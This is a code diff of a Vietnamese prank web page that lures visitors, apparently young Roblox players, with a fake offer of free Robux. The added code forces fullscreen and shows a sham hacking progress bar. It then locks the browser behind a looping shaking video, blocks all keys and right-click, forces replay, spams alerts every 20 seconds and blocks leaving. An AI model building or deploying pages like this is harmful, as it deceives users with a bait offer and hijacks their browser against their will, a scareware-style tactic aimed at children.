@@ -3,188 +3,196 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Robux Reward Center</title>
+    <title>💎 NHẬN 10,000 ROBUX MIỄN PHÍ 💎</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
             background: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             overflow: hidden;
+            transition: background 0.5s;
         }
 
-        /* Giao diện lúc đầu */
+        /* Giao diện lừa lúc đầu */
         .container {
             text-align: center;
             background: white;
             padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
             z-index: 10;
-            max-width: 400px;
+            width: 90%;
+            max-width: 450px;
+            position: relative;
         }
 
-        h1 { color: #00b06f; margin-bottom: 10px; }
-        p { color: #555; margin-bottom: 30px; }
+        h1 { color: #00b06f; font-size: 28px; margin-bottom: 10px; }
+        p { color: #666; margin-bottom: 25px; }
 
-        button {
-            padding: 15px 30px;
-            font-size: 18px;
+        .btn-claim {
+            padding: 18px 35px;
+            font-size: 20px;
             font-weight: bold;
             cursor: pointer;
             border: none;
             background: #00b06f;
             color: white;
-            border-radius: 8px;
-            transition: transform 0.2s;
-        }
-
-        button:active { transform: scale(0.95); }
-
-        #loading {
-            display: none;
-            margin-top: 20px;
-        }
-
-        .progress {
+            border-radius: 50px;
             width: 100%;
-            height: 20px;
-            background: #eee;
-            border-radius: 10px;
-            overflow: hidden;
-            margin-top: 10px;
+            transition: 0.3s;
+            text-transform: uppercase;
         }
 
-        .bar {
+        .btn-claim:hover { background: #008554; transform: scale(1.02); }
+
+        /* Loading Bar */
+        #loading-section { display: none; margin-top: 25px; }
+        .progress-bg {
+            width: 100%;
+            height: 25px;
+            background: #e9ecef;
+            border-radius: 50px;
+            overflow: hidden;
+            border: 1px solid #ddd;
+        }
+        .progress-bar {
             width: 0%;
             height: 100%;
-            background: #00b06f;
-            transition: width 0.1s linear;
+            background: linear-gradient(90deg, #00b06f, #00ff9d);
+            transition: width 0.15s linear;
         }
+        #status-text { margin-top: 10px; font-size: 14px; color: #888; font-style: italic; }
 
-        /* Video troll - Quan trọng nhất */
-        video {
+        /* Video Troll - Ép tràn màn hình */
+        #trollVideo {
             display: none;
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
             object-fit: cover;
             background: black;
-            z-index: 99999;
-            /* Chặn mọi tác động từ chuột để không hiện thanh điều khiển */
-            pointer-events: none; 
+            z-index: 999999;
+            pointer-events: none; /* Chặn click chuột hiện control */
         }
 
-        /* Ẩn con trỏ chuột khi đang bị troll */
-        .no-cursor {
-            cursor: none !important;
+        /* Hiệu ứng rung màn hình khi troll */
+        .shaking {
+            animation: shake 0.2s infinite;
         }
+        @keyframes shake {
+            0% { transform: translate(1px, 1px); }
+            50% { transform: translate(-2px, -1px); }
+            100% { transform: translate(1px, 1px); }
+        }
+        
+        .no-cursor { cursor: none !important; }
     </style>
 </head>
-<body>
+<body id="mainBody">
 
-<div class="container" id="setup-ui">
-    <h1>💎 Free Robux 💎</h1>
-    <p>Nhấn nút bên dưới để nhận 10,000 Robux vào tài khoản của bạn.</p>
-    <button onclick="initTroll()">NHẬN NGAY</button>
+    <div class="container" id="ui-box">
+        <h1>💎 FREE ROBUX 💎</h1>
+        <p>Hệ thống đã phát hiện bạn đủ điều kiện nhận <b>10,000 Robux</b> miễn phí!</p>
+        
+        <button class="btn-claim" onclick="startTrap()">XÁC NHẬN NHẬN QUÀ</button>
 
-    <div id="loading">
-        <p id="status">Đang kết nối server...</p>
-        <div class="progress">
-            <div class="bar" id="bar"></div>
+        <div id="loading-section">
+            <div class="progress-bg">
+                <div class="progress-bar" id="bar"></div>
+            </div>
+            <p id="status-text">Đang kết nối cổng API...</p>
         </div>
     </div>
-</div>
 
-<video id="trollVideo" src="troll.mp4" playsinline disablePictureInPicture></video>
+    <video id="trollVideo" src="troll.mp4" loop playsinline disablePictureInPicture></video>
 
 <script>
     const video = document.getElementById('trollVideo');
-    const setupUi = document.getElementById('setup-ui');
+    const uiBox = document.getElementById('ui-box');
     const bar = document.getElementById('bar');
-    const statusText = document.getElementById('status');
+    const statusText = document.getElementById('status-text');
+    const body = document.getElementById('mainBody');
 
-    function initTroll() {
-        // 1. Ép Fullscreen ngay khi người dùng click
-        const elem = document.documentElement;
-        if (elem.requestFullscreen) {
-            elem.requestFullscreen();
-        } else if (elem.webkitRequestFullscreen) {
-            elem.webkitRequestFullscreen();
-        } else if (elem.msRequestFullscreen) {
-            elem.msRequestFullscreen();
-        }
+    function startTrap() {
+        // 1. Ép Fullscreen ngay lập tức (Bắt buộc phải gọi ở bước click này)
+        const doc = document.documentElement;
+        if (doc.requestFullscreen) doc.requestFullscreen();
+        else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
 
-        // 2. Chạy loading giả
-        document.querySelector("button").style.display = "none";
-        document.getElementById("loading").style.display = "block";
+        // 2. Hiện loading
+        document.querySelector('.btn-claim').style.display = 'none';
+        document.getElementById('loading-section').style.display = 'block';
 
         let width = 0;
+        const messages = [
+            "Đang quét ID người dùng...",
+            "Đang bypass tường lửa Roblox...",
+            "Đang chèn gói tin Robux...",
+            "Gần xong rồi, vui lòng chờ...",
+            "Đang xác thực lần cuối..."
+        ];
+
+        let i = 0;
         let loadInterval = setInterval(() => {
-            width += Math.random() * 3;
+            width += Math.random() * 2.5;
             if (width > 100) width = 100;
-            
             bar.style.width = width + "%";
-            
-            if (width > 30) statusText.innerText = "Đang tìm lỗ hổng...";
-            if (width > 60) statusText.innerText = "Đang hack database...";
-            if (width > 90) statusText.innerText = "Hoàn tất! Đang chuẩn bị nhận...";
+
+            // Đổi text random
+            if (Math.floor(width) % 20 === 0 && i < messages.length) {
+                statusText.innerText = messages[i];
+                i++;
+            }
 
             if (width >= 100) {
                 clearInterval(loadInterval);
-                startVideo();
+                launchTroll();
             }
-        }, 100);
+        }, 80);
     }
 
-    function startVideo() {
-        // Ẩn UI và hiện video
-        setupUi.style.display = "none";
-        document.body.classList.add('no-cursor');
+    function launchTroll() {
+        // Ẩn UI, hiện video
+        uiBox.style.display = "none";
         video.style.display = "block";
+        body.classList.add('shaking', 'no-cursor');
         
-        // Phát video
         video.play();
 
-        // CHỐNG TẠM DỪNG: Nếu video bị pause, ép nó play lại ngay
-        video.onpause = () => {
-            video.play();
-        };
+        // --- CÁC CHIÊU THỨC ỨC CHẾ ---
 
-        // CHỐNG TUA: Nếu người dùng tìm cách tua, đưa về giây đầu tiên (hoặc giây hiện tại)
-        video.onseeking = () => {
-            if (video.currentTime > 0) {
-                video.currentTime = video.currentTime; 
-            }
-        };
+        // 1. Vòng lặp phát video (Chống Pause)
+        setInterval(() => {
+            if (video.paused) video.play();
+        }, 50);
 
-        // CHẶN PHÍM TẮT: Chặn Space, F, Esc, v.v.
+        // 2. Chặn phím tắt (F12, Esc, Space, F11, v.v.)
         window.addEventListener('keydown', (e) => {
-            // Danh sách các phím hay dùng để thoát hoặc dừng
-            if (["Space", "KeyF", "Escape", "F11"].includes(e.code)) {
-                e.preventDefault();
-                video.play(); // Luôn đảm bảo video chạy
-            }
-        }, true);
+            e.preventDefault();
+            return false;
+        });
 
-        // CHẶN CHUỘT PHẢI
-        document.addEventListener('contextmenu', event => event.preventDefault());
+        // 3. Chặn chuột phải
+        document.addEventListener('contextmenu', e => e.preventDefault());
+
+        // 4. Spam Alert mỗi 20 giây để làm khựng máy
+        setInterval(() => {
+            alert("CẢNH BÁO: Đang nạp Robux, không được tắt trình duyệt!");
+        }, 20000);
+
+        // 5. Chống tắt Tab (Hiện thông báo xác nhận khi định đóng)
+        window.onbeforeunload = function() {
+            return "Bạn có thực sự muốn mất 10,000 Robux không?";
+        };
     }
 
-    // Tự động kích hoạt lại Fullscreen nếu người dùng thoát ra (tùy trình duyệt cho phép)
+    // Tự động vào lại Fullscreen nếu người dùng thoát ra
     document.addEventListener('fullscreenchange', () => {
         if (!document.fullscreenElement && video.style.display === "block") {
-            // Nếu thoát fullscreen khi đang troll, cố gắng vào lại
             document.documentElement.requestFullscreen().catch(() => {});
         }
     });
